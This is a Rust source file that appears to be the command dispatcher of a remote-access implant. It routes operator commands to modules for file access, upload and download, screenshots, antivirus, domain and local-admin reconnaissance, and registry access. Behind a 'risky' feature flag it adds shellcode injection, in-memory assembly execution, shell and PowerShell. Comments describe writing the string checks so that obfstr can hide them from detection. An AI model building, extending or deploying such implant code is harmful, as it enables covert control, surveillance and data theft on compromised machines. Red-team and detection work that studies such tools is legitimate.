use fmtools::format; // using obfstr to obfuscate

// Define the command modules
pub(crate) mod cat;
pub(crate) mod cd;
pub(crate) mod cp;
pub(crate) mod curl;
pub(crate) mod download;
pub(crate) mod env;
pub(crate) mod get_av;
pub(crate) mod get_domain;
pub(crate) mod get_local_admins;
pub(crate) mod ls;
pub(crate) mod mkdir;
pub(crate) mod mv;
pub(crate) mod ps;
pub(crate) mod pwd;
pub(crate) mod reg;
pub(crate) mod rm;
pub(crate) mod run;
pub(crate) mod screenshot;
pub(crate) mod sleep;
pub(crate) mod upload;
pub(crate) mod wget;
pub(crate) mod whoami;

#[cfg(feature = "risky")]
pub(crate) mod inline_execute;

#[cfg(feature = "risky")]
pub(crate) mod execute_assembly;

#[cfg(feature = "risky")]
pub(crate) mod shell;

#[cfg(feature = "risky")]
pub(crate) mod shinject;

#[cfg(feature = "risky")]
pub(crate) mod powershell;

// Define a public function to handle the command execution
pub(crate) fn handle_command(
    command: &str,
    args: &[String],
    client: &mut crate::internal::client::Client,
    guid: &str,
) -> String {
    match command {
        // We uglify the syntax a little bit so we can use the obfuscation from the obfstr crate
        _ if command == format!("cat") => cat::cat(&args.join(" ")),
        _ if command == format!("cd") => cd::cd(&args.join(" ")),
        _ if command == format!("cp") => cp::cp(args),
        _ if command == format!("curl") => curl::curl(&args.join(" "), client),
        _ if command == format!("download") => download::download(guid, &args.join(" "), client),
        _ if command == format!("env") => env::env(),
        _ if command == format!("getAv") => get_av::get_av(),
        _ if command == format!("getDom") => get_domain::get_domain(),
        _ if command == format!("getLocalAdm") => get_local_admins::get_local_admins(),
        _ if command == format!("ls") => ls::ls(&args.join(" ")),
        _ if command == format!("mkdir") => mkdir::mkdir(&args.join(" ")),
        _ if command == format!("mv") => mv::mv(args),
        _ if command == format!("ps") => ps::ps(),
        _ if command == format!("pwd") => pwd::pwd(),
        _ if command == format!("reg") => reg::reg(args),
        _ if command == format!("rm") => rm::rm(&args.join(" ")),
        _ if command == format!("run") => run::run(args),
        _ if command == format!("screenshot") => screenshot::screenshot(),
        _ if command == format!("sleep") => sleep::sleep(args, client),
        _ if command == format!("kill") => std::process::exit(0),
        _ if command == format!("upload") => upload::upload(guid, args, client),
        _ if command == format!("wget") => wget::wget(args, client),
        _ if command == format!("whoami") => whoami::whoami(),

        #[cfg(feature = "risky")]
        _ if command == format!("inline-execute") => inline_execute::inline_execute(args, client),
        #[cfg(feature = "risky")]
        _ if command == format!("execute-assembly") => {
            execute_assembly::execute_assembly(args, client)
        }
        #[cfg(feature = "risky")]
        _ if command == format!("shell") => shell::shell(&args.join(" ")),
        #[cfg(feature = "risky")]
        _ if command == format!("shinject") => shinject::shinject(args, client),
        #[cfg(feature = "risky")]
        _ if command == format!("powershell") => powershell::powershell(args),
        #[cfg(not(feature = "risky"))]
        _ if [
            "inline-execute",
            "execute-assembly",
            "shell",
            "shinject",
            "powershell",
        ]
        .contains(&command) =>
        {
            format!("Risky command received but 'riskyMode' disabled in config.toml.")
        }

        _ => format!("Unknown command."),
    }
}
